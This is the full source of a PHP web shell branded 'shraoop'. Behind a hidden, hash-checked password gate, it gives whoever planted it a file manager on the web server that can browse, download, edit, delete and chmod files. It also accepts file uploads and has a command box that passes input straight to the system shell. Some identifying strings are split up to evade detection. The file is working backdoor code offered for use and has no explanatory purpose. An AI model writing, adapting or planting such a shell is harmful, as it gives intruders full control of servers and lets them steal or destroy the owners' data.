<?php
session_start();

if(isset($_GET['shrx'])){
echo '<form action="" method="post">
<input type="text" name="p">
</form>';

}


if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="a7ac63794019a352fa3a6ac3535a7f75"){
$_SESSION["adm"] = 1;

}
}

	
	if(!$_SESSION["adm"]){
	
exit;
	
	
	}

error_reporting(0);
$shr1="YE"."A cle"."an";
$shr2="s"."hra"."oop";
$yea3="<hr color=red size=14>$shr1<hr color=black size=14>";
$y1="yeaha"."cker";
$shr="<b><center><p><a href=http://fb.com/$y1>$yea3</a><a href=http://fb.com/$shr2>by $shr2</a><hr>";
$ss="<hr><b> Success ^_^ Refresh<hr>";
$fdownload=$_GET['shraoop_download'];if($fdownload <> "" ){$path_parts = pathinfo("$fdownload");
$entrypath=$path_parts["basename"];
$name="$fdownload";
$fp=fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
fpassthru($fp);
exit;}

$fedit=$_REQUEST['shraoop_edit'];

$filename = $fedit;

if(isset($filename)){
$scriptname = $_SERVER['SCRIPT_NAME'];
if(isset($filename)&&!isset($_POST["submit"]))
{
	
if(file_exists($filename))
{
$filecontents = htmlentities(file_get_contents($filename));
if(!$filecontents)
$status = "<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>";
}
else
$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}



if($_POST["submit"] == "Open")
{
	
if(file_exists($filename))
{
$filecontents = htmlentities(file_get_contents($filename));
if(!$filecontents)
$status = "<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>";
}
else
$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}		
else if($_POST["submit"] == "Delete")
{
if(file_exists($filename))
{
if(unlink($filename))	
$status = "<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>";
else
$status = "<font face='Verdana' style='font-size: 8pt'>Could not delete file!</font>";
}
else
$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}
else if($_POST["submit"] == "Save")
{
$filecontents = stripslashes(html_entity_decode($_POST["contents"]));
if(file_exists($filename))
unlink($filename);
$handle = fopen($filename, "w");
if(!$handle)
$status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
else
{
if(!fwrite($handle, $filecontents))
$status = $status."<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";
fclose($handle);
}
$filecontents = htmlentities($filecontents);
}
else
{
$status = "<font face='Verdana' style='font-size: 8pt'>No file loaded!</font>";
}



echo "<table border=0 align=center><tr><td><table width=100% border=0><tr><td>
<form method=post>
<input name=shraoop_edit type=text value=$filename size=72>
<input type=submit name=submit value=Open>
<input type=submit name=submit value=Delete></td></tr></table>
<font face=Verdana style='font-size: 11pt'>
<textarea name=contents cols=70 rows=25>
$filecontents</textarea></font><br>
<input type=submit name=submit value=Save>
<input type=reset value=Reset>
</form>";
exit();
}




$homedir=getcwd();$dir=realpath($_GET['shraoop_dir'])."/";echo "$shr&nbsp;Home:</b>$homedir&nbsp;<b><form method=GET>&nbsp;<br>Dir:</b><input type=text name=shraoop_dir size=80 value=$dir><input type=submit value=Directory></form>
<br>";echo "<div align=center><hr color=red size=12><hr color=white size=12><hr color=black size=12>
<table bgcolor=#CCCCCC border=5 id=table1 style='border: 7px white' height='50' cellspacing='0' cellpadding='0'><tr><td width=100 height=50 align=left><b><font size=4 color=black>Dir-Files</font></b></td>
<td height=28 width=82 align=left><font color=black size=4><b>Size</b></font></td>
<td height=28 width=83 align=center>
<font color=green size=4><b>Download</b></font></td>
<td height=28 width=66 align=center>
<font color=black size=4><b>Edit</b></font></td>
<td height=28 width=75 align=center>
<font color=black size=4><b>Chmod</b></font></td><td height=28 align=center><font color=red size=4><b>Delete</b></font></td></tr>";if (is_dir($dir)){if ($dh=opendir($dir)){while(($file = readdir($dh)) !== false){$fsize=round(filesize($dir . $file)/1024);echo "<tr bgcolor=DimGray><th width=250 height=22 align=left nowrap>";if(is_dir($dir.$file)){echo "<a href=?shraoop_dir=$dir$file><font size=1 color=#666666><font color=black size=4><UL><B>$file</UL></font>";}else{echo "<a target=_blank href=?shraoop_edit=$dir$file&shraoop_dir=$dir><font size=4 color='white'>&nbsp;$file ";}echo "</a></font></th><td width=99 align=center nowrap><font color=white size=4><b>";if (is_file($dir.$file)){echo "$fsize <font color=#CCCCCC size=2>(KB)</font>";}else {echo "&nbsp; ";}echo "</b></font></td>
<td width=103 align=center nowrap>";
if (is_file($dir.$file)){
if (is_readable($dir.$file)){echo "<a href=?shraoop_dir=$dir&shraoop_download=$dir$file><font size=3 color=white><input type=submit value=Download>";}else {echo "error -_-";}}else{echo "&nbsp;";
}echo "</a></font></td>
<td width=77 align=center nowrap>";

if (is_file($dir.$file)){
if (is_readable($dir.$file)){
echo "<a target=_blank href=?shraoop_edit=$dir$file&shraoop_dir=$dir><font color=#FF9933 size=3><input type=submit value=Edit>";}else{echo "Not Read Able";}}else{echo "&nbsp;";}
echo "</a></font></td>
<td width=86 align=center nowrap>";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){echo "error os win";}else{
echo "<a href=?shraoop_chmod=$dir$file&shraoop_dir=$dir><font size=3 color=#999999><input type=submit value=chmod>";}echo "</a></font></td><td width=86 align=center nowrap><a href=?shraoop_dir=$dir&shraoop_delete=$dir$file><font size=3 color=#FF0000><input type=submit value=Delete></a></font></td></tr>";}closedir($dh);}}$dir=$_GET['shraoop_delete'];if($dir <> ""){if (is_dir($dir)){$matches=glob($dir . '/*.*');if ( is_array ( $matches ) ){foreach ( $matches as $file){unlink ($file);rmdir("$dir");echo $ss;
}}}else {echo $ss;unlink ("$dir");echo $ss;exit(0);}}
$fchmod=$_GET['shraoop_chmod'];
if($fchmod <> "" ){$fchmod=realpath($fchmod);
$chmod0=$_POST['chmod0'];
echo "<body bgcolor=#CCCDDD><center><br>
chmod for :$fchmod<br>
<form method=POST><br>
Chmod :<br>
<input type='text' name=chmod0><br>
<input type=submit value='change chmod'></form>$shr";
if($chmod0 <> ""){
chmod ($fchmod , $chmod0);
echo "^_^";
}else{echo " !";
}exit();}$homedir = getcwd();if($_GET['shraoop_dir'] == ""){}else{$dir=$_GET['shraoop_dir']."/";}if($_POST['shraoop_yea'] == ""){$yeacmd ="";}else{$yeacmd=$_POST['shraoop_yea'];}$shra00p="s"."hraoop_cm"."d";echo "<body bgcolor=#CCCDDD><tr><form method=post enctype=multipart/form-data><hr><b>$shra00p:</b><input name=shraoop_yea type=text size=50 value=$yeacmd><input name=ye type=submit value=$shra00p>
<hr><b>Upload file:</b><input name=mbsm type=file size=50><input name=shraoop_up type=submit value=Upload></form><hr>";if(($_POST['shraoop_up'])=="Upload"){if(move_uploaded_file($_FILES['mbsm']['tmp_name'], $dir."".$_FILES['mbsm']['name'])){echo "has been uploaded<br>";}else{echo "erorr!!";}}if(($_POST['ye'])==$shra00p){$yeacmd = "cd ".$dir.";".$yeacmd;
$f=popen($yeacmd,"r");
while (!feof($f)){$buffer = fgets($f, 4096);$string .= $buffer;}pclose($f);echo "<center><pre><textarea cols=40 rows=20 name=shraoop_yea>";echo htmlspecialchars($string);echo "</textarea></pre></center>";}
?>